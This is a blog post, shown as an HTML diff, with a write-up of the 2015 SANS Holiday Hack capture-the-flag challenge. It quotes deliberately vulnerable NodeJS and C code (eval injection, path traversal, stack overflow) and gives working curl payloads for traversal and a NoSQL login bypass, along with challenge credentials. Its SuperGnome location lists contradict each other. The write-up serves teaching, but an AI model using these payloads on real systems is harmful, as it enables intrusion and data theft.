@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta itemprop="name" content="The 2015 SANS Holiday Hack Challenge - Solution">
+  <title>The 2015 SANS Holiday Hack Challenge - Solution</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta itemprop="description" content="Summary Which commands are sent across the Gnome’s command-and-control channel? EXEC:iwconfig in packet 363 EXEC:cat /tmp/iwlistscan.txt in packet 573 What image appears in the photo the Gnome sent across the channel from the Dosis home? A tidy children&rsquo;s room is depicted in the photo. The photo includes something like legs that are probably attached to the camera. At the bottom is a label with &ldquo;GnomeNet-NorthAmerica&rdquo;. What operating system and CPU type are used in the Gnome?">
+
+  
+  <meta itemprop="keywords" content="certifications,challenge,ctf,exploit,exploit-exercises,offensive-security,protostar,reverse-engineering,sans,seh," />
+  
+    <meta itemprop="wordCount" content="2969">
+  
+
+  <meta property="og:title" content="The 2015 SANS Holiday Hack Challenge - Solution" />
+  <meta property="og:description" content="Summary Which commands are sent across the Gnome’s command-and-control channel? EXEC:iwconfig in packet 363 EXEC:cat /tmp/iwlistscan.txt in packet 573 What image appears in the photo the Gnome sent across the channel from the Dosis home? A tidy children&rsquo;s room is depicted in the photo. The photo includes something like legs that are probably attached to the camera. At the bottom is a label with &ldquo;GnomeNet-NorthAmerica&rdquo;. What operating system and CPU type are used in the Gnome?" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="http://camelinc.info/blog/2016/01/The-2015-SANS-Holiday-Hack-Challenge---Solution/" />
+  
+
+  
+  <meta property="og:updated_time" content="2016-01-05 01:23:27 &#43;0000 UTC"/>
+  
+  
+  
+  
+
+  
+    <meta name="twitter:card" content="summary"/>
+  
+
+  
+  <meta name="twitter:title" content="The 2015 SANS Holiday Hack Challenge - Solution"/>
+  <meta name="twitter:description" content="Summary Which commands are sent across the Gnome’s command-and-control channel? EXEC:iwconfig in packet 363 EXEC:cat /tmp/iwlistscan.txt in packet 573 What image appears in the photo the Gnome sent across the channel from the Dosis home? A tidy children&rsquo;s room is depicted in the photo. The photo includes something like legs that are probably attached to the camera. At the bottom is a label with &ldquo;GnomeNet-NorthAmerica&rdquo;. What operating system and CPU type are used in the Gnome?"/>
+  
+  
+
+
+  <meta name="generator" content="Hugo 0.15" />
+  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
+  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
+
+  
+  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />
+
+  
+
+  
+  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
+
+
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  
+</head>
+ 
+
+
+  <body>
+
+  
+<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
+  <div id = "wrapper">
+
+<div class="navbar navbar-default" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
+        </div>
+
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+					
+          <h2>http://camelinc.info/</h2>
+					
+					<li><a href="http://camelinc.info/about">About </a></li>
+					
+					<li><a href="http://camelinc.info/post">Posts </a></li>
+					
+          </ul>
+        </div>
+      </div>
+    </div>
+
+       
+       <div id="sidebar-wrapper">
+        <ul class="sidebar-nav">
+					<img src="/img/avatar.png" />
+          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3></h3></li>
+          <hr />
+
+					
+						<li><a href="http://camelinc.info/about">About </a></li>
+					
+						<li><a href="http://camelinc.info/post">Posts </a></li>
+					
+          <hr />
+
+          <div id="social-wrapper">
+           
+             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
+           
+
+           
+             
+           
+
+           
+             
+           
+
+           
+             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
+           
+         </div>
+
+       </ul>
+     </div>
+
+     <div class="container">
+
+
+
+  <div id="article">
+    <div class="article-title">The 2015 SANS Holiday Hack Challenge - Solution</div>
+    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2016-01-05</small></p> <hr/>
+    <div class="post">
+      
+
+<h1 id="summary:fc53e74f05f8f7542d80a6ee08c867a6">Summary</h1>
+
+<ol>
+<li>Which commands are sent across the Gnome’s command-and-control channel?
+
+<ol>
+<li><code>EXEC:iwconfig</code> in packet 363</li>
+<li><code>EXEC:cat /tmp/iwlistscan.txt</code> in packet 573</li>
+</ol></li>
+<li>What image appears in the photo the Gnome sent across the channel from the Dosis home?
+
+<ul>
+<li>A tidy children&rsquo;s room is depicted in the photo. The photo includes something like legs that are probably attached to the camera. At the bottom is a label with &ldquo;GnomeNet-NorthAmerica&rdquo;.</li>
+</ul></li>
+<li>What operating system and CPU type are used in the Gnome?  What type of web framework is the Gnome web interface built in?
+
+<ol>
+<li>OpenWRT (r47650) on ARM</li>
+<li>NodeJS with Mongodb</li>
+</ol></li>
+<li>What kind of a database engine is used to support the Gnome web interface? What is the plaintext password stored in the Gnome database?
+
+<ol>
+<li>MongoDB</li>
+<li>The following credentials are stored in the firmware image
+
+<ol>
+<li><code>admin</code> : <code>SittingOnAShelf</code></li>
+<li><code>user</code> : <code>user</code></li>
+</ol></li>
+</ol></li>
+<li>What are the IP addresses of the five SuperGnomes scattered around the world, as verified by Tom Hessman in the Dosis neighborhood?
+
+<ol>
+<li>SG-01 52.2.229.189 (United States, Ashburn)</li>
+<li>SG-02 52.34.3.80 (United States, Boardman)</li>
+<li>SG-03 52.64.191.71 (Australia, Sydney)</li>
+<li>SG-04 52.192.152.132 (Japan, Tokyo)</li>
+<li>SG-05 54.233.105.81 (Brazil)</li>
+</ol></li>
+<li>Where is each SuperGnome located geographically?</li>
+<li>Describe the vulnerabilities you discovered in the Gnome firmware.
+
+<ol>
+<li>Storage of clear text passwords in the MongoDB database.</li>
+<li>Local file inclusion via directory traversal in <code>routes/index.js:195</code>
+
+<ul>
+<li>The code checks whether the requested file path contains a &ldquo;.png&rdquo;.</li>
+<li>The file upload can be utilized to create a temporary folder with a suitable name.</li>
+</ul></li>
+<li>Possible NoSQL injection for the login post in <code>routes/index.js:109</code>.
+
+<ul>
+<li>Might not possible as &ldquo;extended = false&rdquo; for the firmware as described in <a href="https://stackoverflow.com/questions/24330014/bodyparser-is-deprecated-express-4#comment-49638474">bodyParser is deprecated express 4</a></li>
+</ul></li>
+<li>Possible server side javascript injection for file upload in <code>routes/index.js:166</code>
+
+<ul>
+<li>The user provided parameter: <code>posproc</code> is utilized in an unsanatized <code>eval()</code></li>
+</ul></li>
+<li>Stack based buffer overflow in sgnet_readn that is utilized in <code>sgstatd.c:147:</code>
+
+<ul>
+<li>The stack canary is static and can easily be repaired.</li>
+<li>The stack canary includes a <code>JMP ESP</code> as a partial command. This assembly instruction is crucial for exploitation.</li>
+</ul></li>
+</ol></li>
+<li>Describe the technique you used to gain access to each SuperGnome’s gnome.conf file.
+
+<ol>
+<li>SG-01: Administrative credentials from the firmware image provided full access.</li>
+<li>SG-02: A path traversal vulnerability allowed to download arbitrary files in the context of a standard user.</li>
+<li>SG-03: A NoSQL injection in the login form was exploited in order to login as admin user.</li>
+<li>SG-04: The system was compromised via server side javascript injection in NodeJS.</li>
+<li>SG-05: Weaponize remote exploit for sgstadt (4242/tcp) in order to  a reverse shell.</li>
+</ol></li>
+</ol>
+
+<h1 id="part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets:fc53e74f05f8f7542d80a6ee08c867a6">Part 1: Dance of the Sugar Gnome Fairies: Curious Wireless Packets</h1>
+
+<p>The packet capture includes mostly traffic on port 53/udp.
+A client system at 52.2.229.189 is querying the dns server at 10.42.0.18 for a TXT record.
+In packet 363 the server responds with a base64 encoded string <code>EXEC:iwconfig</code>.
+Subsequently, the client starts sending TXT responses with base64 encoded data to the server.
+The response starts with a start marker <code>EXEC:START_STATE</code>.
+The end of the exec output is marked by an encoded <code>EXEC:STOP</code>.
+In packet 573 another command is scheduled by the server: <code>EXEC:cat /tmp/iwlistscan.txt</code>.
+Finally, in packet 875 the server requests a file with <code>FILE:/root/Pictures/snapshot_CURRENT.jpg</code>.</p>
+
+
+
+<figure class="fcenter fsmall">
+    <a href="/img/post/2015/holidayhack/snapshot_CURRENT.jpg" data-lightbox="default" data-title="Nobody at home." >
+        <img src="/img/post/2015/holidayhack/snapshot_CURRENT.jpg" alt="Nobody at home." >
+    </a>
+</figure>
+
+
+
+<p>With this information a script can easily be created that automates that task.
+Find the code below in the code section <a href="#decrypt-c-c-communication:f01f8c0644e5f5332f225b6c091c5a59">decode.py</a>.</p>
+
+<h1 id="part-2-i-ll-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit:fc53e74f05f8f7542d80a6ee08c867a6">Part 2: I’ll be Gnome for Christmas: Firmware Analysis for Fun and Profit</h1>
+
+<p>After unpacking the firmware binary with binwalk, let&rsquo;s take a look at the system.
+A look at <code>etc/banner</code> makes clear, that the image is based on OpenWRT, a popular alternative router firmware.</p>
+
+<div class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">$ </span>cat etc/banner
+  _______                     ________        __
+ <span class="p">|</span>       <span class="p">|</span>.-----.-----.-----.<span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>.----.<span class="p">|</span>  <span class="p">|</span>_
+ <span class="p">|</span>   -   <span class="o">||</span>  _  <span class="p">|</span>  -__<span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="o">||</span>   _<span class="o">||</span>   _<span class="p">|</span>
+ <span class="p">|</span>_______<span class="o">||</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="o">||</span>________<span class="o">||</span>__<span class="p">|</span>  <span class="p">|</span>____<span class="p">|</span>
+          <span class="p">|</span>__<span class="p">|</span> W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ DESIGNATED DRIVER <span class="o">(</span>Bleeding Edge, r47650<span class="o">)</span>
+ -----------------------------------------------------
+  * <span class="m">2</span> oz. Orange Juice         Combine all juices in a
+  * <span class="m">2</span> oz. Pineapple Juice      tall glass filled with
+  * <span class="m">2</span> oz. Grapefruit Juice     ice, stir well.
+  * <span class="m">2</span> oz. Cranberry Juice
+ -----------------------------------------------------
+</code></pre></div>
+
+
+<p>Consequently, the system architecture has to be ARM.
+Better verify that assumption by checking a system binary.</p>
+
+<div class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">$ </span>file bin/pwd 
+bin/pwd: ELF 32-bit LSB  executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, stripped
+</code></pre></div>
+
+
+<p>Digging deeper to find the web application.
+In <code>www</code> there are a few JavaScript files and some subdirectories.
+These point towards a NodeJS based web application.</p>
+
+<p>In the first lines of <code>www/app.js</code> mongodb is mentioned a few times.
+This is probably the backend database for the web application.
+According to <code>etc/mongodb.conf</code> the database files are located in <code>/opt/mongodb</code>.
+Quickly running strings over the files yield some promising results.</p>
+
+<div class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">$ </span>strings gnome.0
+...
+gnome.users
+username
+user
+password
+user
+user_level
+username
+admin
+password
+SittingOnAShelf
+user_level
+...
+</code></pre></div>
+
+
+<p>Looks like the application stores cleartext passwords.
+We can also follow the guide from <a href="https://pen-testing.sans.org/blog/2015/12/03/nosql-no-problem-pillaging-mongodb-for-fun-and-profit">SANS Penetration Testing</a> to pillage the database.</p>
+
+<h1 id="part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt:fc53e74f05f8f7542d80a6ee08c867a6">Part 3: Let it Gnome!  Let it Gnome!  Let it Gnome! Internet-Wide Scavenger Hunt</h1>
+
+<p>The first IP address is listed in the <code>etc/hosts</code> of the firmware image.
+With the information from the web application a shodan search might also yield some useful results.
+<a href="https://www.shodan.io/search?query=SuperGnome&amp;language=en">shodan.io</a> provides four additional IP addresses running a SuperGnome web interface.</p>
+
+<ol>
+<li><a href="/img/post/2015/holidayhack/52.2.229.189.png">Supergnome 1</a> - 52.2.229.189 (United States, Ashburn)</li>
+<li><a href="/img/post/2015/holidayhack/52.34.3.80.png">Supergnome 2</a> - 52.34.3.80 (Japan, Tokyo)</li>
+<li><a href="/img/post/2015/holidayhack/52.64.191.71.png">Supergnome 3</a> - 52.64.191.71 (Brazil)</li>
+<li><a href="/img/post/2015/holidayhack/52.192.152.132.png">Supergnome 4</a> - 52.192.152.132 (Australia, Sydney)</li>
+<li><a href="/img/post/2015/holidayhack/54.233.105.81.png">Supergnome 5</a> - 54.233.105.81 (United States, Boardman)</li>
+</ol>
+
+<p>Pinning the IP addresses on a map gives us the following overview.</p>
+
+
+
+<figure class="fcenter fsmall">
+    <a href="/img/post/2015/holidayhack/shodan-map.png" data-lightbox="default" data-title="Supergnome Map" >
+        <img src="/img/post/2015/holidayhack/shodan-map.png" alt="Supergnome Map" >
+    </a>
+</figure>
+
+
+
+<h1 id="part-4-there-s-no-place-like-gnome-for-the-holidays-gnomage-pwnage:fc53e74f05f8f7542d80a6ee08c867a6">Part 4: There’s No Place Like Gnome for the Holidays: Gnomage Pwnage</h1>
+
+<h2 id="vulnerabilities:fc53e74f05f8f7542d80a6ee08c867a6">Vulnerabilities</h2>
+
+<h3 id="improper-storage-of-passwords:fc53e74f05f8f7542d80a6ee08c867a6">Improper storage of passwords</h3>
+
+<p>Passwords are stored in clear text in the MongoDB database.</p>
+
+<pre><code>user: user
+admin: SittingOnAShelf
+</code></pre>
+
+<h3 id="nosql-injection:fc53e74f05f8f7542d80a6ee08c867a6">NoSQL injection</h3>
+
+<p>Possible NoSQL injection for the login post in <code>routes/index.js:109</code>.
+Exploitation might not possible as &ldquo;extended = false&rdquo; for the firmware as described at <a href="https://stackoverflow.com/questions/24330014/bodyparser-is-deprecated-express-4#comment-49638474">StackExchange</a>.</p>
+
+<div class="highlight"><pre><code class="language-Javascript" data-lang="Javascript"><span class="p">...</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">db</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">msgs</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="hll">  <span class="nx">db</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">).</span><span class="nx">findOne</span><span class="p">({</span><span class="nx">username</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">user</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// STUART: Removed this in favor of below.  Really guys?</span>
+</span>  <span class="c1">//db.get(&#39;users&#39;).findOne({username: (req.body.username || &quot;&quot;).toString(10), password: (req.body.password || &quot;&quot;).toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars</span>
+<span class="p">...</span>
+</code></pre></div>
+
+
+<h3 id="server-side-javascript-injection:fc53e74f05f8f7542d80a6ee08c867a6">Server Side Javascript Injection</h3>
+
+<p>Possible server side javascript injection for file upload in <code>routes/index.js:166</code>.
+The user provided parameter: <code>posproc</code> is utilized in an unsanatized <code>eval()</code>.</p>
+
+<div class="highlight"><pre><code class="language-Javascript" data-lang="Javascript"><span class="p">...</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/files&#39;</span><span class="p">,</span> <span class="nx">upload</span><span class="p">.</span><span class="nx">single</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">),</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">sessions</span><span class="p">[</span><span class="nx">sessionid</span><span class="p">].</span><span class="nx">logged_in</span> <span class="o">===</span> <span class="kc">true</span> <span class="o">&amp;&amp;</span> <span class="nx">sessions</span><span class="p">[</span><span class="nx">sessionid</span><span class="p">].</span><span class="nx">user_level</span> <span class="o">&gt;</span> <span class="mi">99</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// NEDFORD: this should be 99 not 100 so admins can upload</span>
+    <span class="kd">var</span> <span class="nx">msgs</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">buffer</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">mimetype</span> <span class="o">===</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">msgs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;Upload successful.&#39;</span><span class="p">);</span>
+      <span class="kd">var</span> <span class="nx">postproc_syntax</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">postproc</span><span class="p">;</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;File upload syntax:&quot;</span> <span class="o">+</span> <span class="nx">postproc_syntax</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">postproc_syntax</span> <span class="o">!=</span> <span class="s1">&#39;none&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">postproc_syntax</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">msgs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;Executing post process...&#39;</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">result</span><span class="p">;</span>
+        <span class="nx">d</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+<span class="hll">          <span class="nx">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="nx">postproc_syntax</span> <span class="o">+</span> <span class="s1">&#39;)&#39;</span><span class="p">);</span>
+</span>        <span class="p">});</span>
+        <span class="c1">// STUART: (WIP) working to improve image uploads to do some post processing.</span>
+        <span class="nx">msgs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;Post process result: &#39;</span> <span class="o">+</span> <span class="nx">result</span><span class="p">);</span>
+      <span class="p">}</span>
+<span class="p">...</span>
+</code></pre></div>
+
+
+<h3 id="path-traversal:fc53e74f05f8f7542d80a6ee08c867a6">Path Traversal</h3>
+
+<p>Local file inclusion via directory traversal in <code>routes/index.js:187</code>
+The code checks whether the requested file path contains a &ldquo;.png&rdquo;.
+The file upload can be utilized to create a temporary folder with a suitable name.</p>
+
+<div class="highlight"><pre><code class="language-Javascript" data-lang="Javascript"><span class="p">...</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/cam&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">camera</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">camera</span><span class="p">);</span>
+  <span class="c1">// check for .png</span>
+<span class="hll">  <span class="c1">//if (camera.indexOf(&#39;.png&#39;) == -1) // STUART: Removing this...I think this is a better solution... right?</span>
+</span>  <span class="nx">camera</span> <span class="o">=</span> <span class="nx">camera</span> <span class="o">+</span> <span class="s1">&#39;.png&#39;</span><span class="p">;</span> <span class="c1">// add .png if its not found</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Cam:&quot;</span> <span class="o">+</span> <span class="nx">camera</span><span class="p">);</span>
+  <span class="nx">fs</span><span class="p">.</span><span class="nx">access</span><span class="p">(</span><span class="s1">&#39;./public/images/&#39;</span> <span class="o">+</span> <span class="nx">camera</span><span class="p">,</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">F_OK</span> <span class="o">|</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">R_OK</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+	    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;File ./public/images/&#39;</span> <span class="o">+</span> <span class="nx">camera</span> <span class="o">+</span> <span class="s1">&#39; does not exist or access denied!&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">});</span>
+  <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="s1">&#39;./public/images/&#39;</span> <span class="o">+</span> <span class="nx">camera</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+  <span class="p">});</span>
+<span class="p">...</span>
+</code></pre></div>
+
+
+<h3 id="remote-buffer-overflow:fc53e74f05f8f7542d80a6ee08c867a6">Remote Buffer Overflow</h3>
+
+<p>A buffer overflow exists in sgnet_readn that is utilized in <code>sgstatd.c:147:</code>.
+The input buffer is 100 bytes while the function sgnet_readn reads 200 bytes.
+This is a classical stack based buffer overflow.</p>
+
+<p>The stack canary is static and can easily be repaired.
+The stack canary includes a <code>JMP ESP</code> as a partial command. This assembly instruction is crucial for exploitation.</p>
+
+<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">...</span>
+<span class="kt">int</span> <span class="n">sgstatd</span><span class="p">(</span><span class="n">sd</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;movl $0xe4ffffe4, -4(%ebp)&quot;</span><span class="p">);</span>
+	<span class="c1">//Canary pushed</span>
+
+	<span class="kt">char</span> <span class="n">bin</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">This function is protected!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+	<span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+	<span class="c1">//recv(sd, &amp;bin, 200, 0);</span>
+<span class="hll">	<span class="n">sgnet_readn</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bin</span><span class="p">,</span> <span class="mi">200</span><span class="p">);</span>
+</span>	<span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;movl -4(%ebp), %edx</span><span class="se">\n\t</span><span class="s">&quot;</span> <span class="s">&quot;xor $0xe4ffffe4, %edx</span><span class="se">\n\t</span><span class="s">&quot;</span>	<span class="c1">// Canary checked</span>
+		<span class="s">&quot;jne sgnet_exit&quot;</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="p">}</span>
+<span class="p">...</span>
+</code></pre></div>
+</p>
+
+<h2 id="exploitation:fc53e74f05f8f7542d80a6ee08c867a6">Exploitation</h2>
+
+<h3 id="supergnome-1:fc53e74f05f8f7542d80a6ee08c867a6">Supergnome 1</h3>
+
+<p>The cleartext credentials stored in the firmware image allow administrative access to the system.</p>
+
+<pre><code>user: admin
+pass: SittingOnAShelf
+</code></pre>
+
+<p>Simply navigate to the files section and download the configuration file.</p>
+
+<p><div class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="err">Gnome</span> <span class="err">Serial</span> <span class="err">Number:</span> <span class="err">NCC1701</span>
+</code></pre></div>
+</p>
+
+<p>That&rsquo;s an obvious easter egg.
+NCC-1701 is the alternative name for the starship USS Enterprise in the fictional Star Trek universe.</p>
+
+<p>
+
+<figure class="fcenter fsmall">
+    <a href="/img/post/2015/holidayhack/NCC1701.jpg" data-lightbox="default" data-title="NCC1701" >
+        <img src="/img/post/2015/holidayhack/NCC1701.jpg" alt="NCC1701" >
+    </a>
+</figure>
+
+</p>
+
+<h3 id="supergnome-2:fc53e74f05f8f7542d80a6ee08c867a6">Supergnome 2</h3>
+
+<p>A path traversal vulnerability allowed to download arbitrary files in the context of the admin user.
+First, a temporary directory has to be created by uploading a configuration file.
+The server response includes the full path to the temporary directory.
+According to the application code, the temporary directory is created and never deleted.</p>
+
+<p>
+
+<figure class="fcenter">
+    <a href="/img/post/2015/holidayhack/Path_Traversal-1.png" data-lightbox="default" data-title="Path Traversal - step 1" >
+        <img src="/img/post/2015/holidayhack/Path_Traversal-1.png" alt="Path Traversal - step 1" >
+    </a>
+</figure>
+
+</p>
+
+<pre><code>curl -s -k  -X 'POST' -b 'sessionid=Knd8Zz6X77F0bdC3ldBa' \
+    -H 'Content-Type: application/x-www-form-urlencoded' \
+    --data-binary $'filen=.png/file.cfg&amp;file=eicar.com.txt' \
+    'http://52.34.3.80/settings'
+</code></pre>
+
+<p>The temporary directory path circumvents the file extension check.
+Simply add the respective path in the request to a camera image in order to exploit the vulnerability.
+Let&rsquo;s download files in the context of the gnome-admin user!</p>
+
+<p>
+
+<figure class="fcenter">
+    <a href="/img/post/2015/holidayhack/Path_Traversal-2.png" data-lightbox="default" data-title="Path Traversal - step 2" >
+        <img src="/img/post/2015/holidayhack/Path_Traversal-2.png" alt="Path Traversal - step 2" >
+    </a>
+</figure>
+
+</p>
+
+<pre><code>curl -s -k  -X 'GET' -b 'sessionid=Knd8Zz6X77F0bdC3ldBa' \
+    'http://52.34.3.80/cam?camera=%2e%2e/upload/iLZKMlKm/.png/%2e%2e/%2e%2e/%2e%2e/%2e%2e/files/gnome.conf'
+</code></pre>
+
+<p>Finally, take a short glance at the gnome configuration file.</p>
+
+<p><div class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="err">Gnome</span> <span class="err">Serial</span> <span class="err">Number:</span> <span class="err">XKCD988</span>
+</code></pre></div>
+</p>
+
+<p>Again, the gnome serial number is an easter egg and points to <a href="http://xkcd.com/988/">XKCD 988</a></p>
+
+<p>
+
+<figure class="fcenter fsmall">
+    <a href="http://imgs.xkcd.com/comics/tradition.png" data-lightbox="default" data-title="Tradition" >
+        <img src="http://imgs.xkcd.com/comics/tradition.png" alt="Tradition" >
+    </a>
+</figure>
+
+</p>
+
+<h3 id="supergnome-3:fc53e74f05f8f7542d80a6ee08c867a6">Supergnome 3</h3>
+
+<p>A NoSQL injection in the login form was exploited in order to login as admin user.</p>
+
+<p>
+
+<figure class="fcenter">
+    <a href="/img/post/2015/holidayhack/NoSQL_injection.png" data-lightbox="default" data-title="NoSQL Injection on the login form." >
+        <img src="/img/post/2015/holidayhack/NoSQL_injection.png" alt="NoSQL Injection on the login form." >
+    </a>
+</figure>
+
+</p>
+
+<pre><code>curl -s -k -X 'POST' -b 'sessionid=blcGsGlPTvewgL5k3VIk' \
+    -H 'Content-Type: application/json' \
+    --data-binary $'{\x0d\x0a\x09\&quot;username\&quot;: {\&quot;$ne\&quot;: \&quot;user\&quot;},\x0d\x0a\x09\&quot;password\&quot;: {\&quot;$gt\&quot;: \&quot;\&quot;}\x0d\x0a}' \
+    'http://52.64.191.71/'
+</code></pre>
+
+<p>Some additional NoSQL trickery lets us brute-force the accounts and passwords.</p>
+
+<p>
+
+<figure class="fcenter">
+    <a href="/img/post/2015/holidayhack/NoSQL_injection_bruteforce.png" data-lightbox="default" data-title="Brute-Forcing the password for admin." >
+        <img src="/img/post/2015/holidayhack/NoSQL_injection_bruteforce.png" alt="Brute-Forcing the password for admin." >
+    </a>
+</figure>
+
+</p>
+
+<p>With admin privileges, simply download the gnome configuration.</p>
+
+<p><div class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="err">Gnome</span> <span class="err">Serial</span> <span class="err">Number:</span> <span class="err">THX1138</span>
+</code></pre></div>
+</p>
+
+<p>The serial number is the title of an early Georg Lucas movie.
+Go watch it!</p>
+
+<p>
+
+<figure class="fcenter fsmall">
